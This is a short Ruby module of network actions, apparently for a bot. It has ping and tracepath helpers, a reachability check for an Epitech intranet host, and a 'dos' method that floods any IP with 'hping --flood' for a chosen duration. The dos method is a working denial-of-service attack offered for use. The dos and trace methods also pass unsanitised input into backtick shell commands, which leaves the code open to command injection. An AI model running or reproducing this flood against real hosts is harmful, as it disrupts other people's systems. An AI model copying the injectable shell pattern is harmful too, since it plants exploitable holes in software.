# encoding: utf-8

module Action

  def self.dos(ip, duration)
    `timeout #{duration} hping --flood '#{ip}' 2>&1`
  end

  def self.ping(ip)
    Net::Ping::External.new(ip).ping?
  end

  def self.intra_state
    Net::Ping::External.new("intra.epitech.eu").ping? ? "Intra ok" : "Intra down"
  end

  def self.trace ip
    `tracepath '#{ip}'`.to_s.split("\n")
  end

end
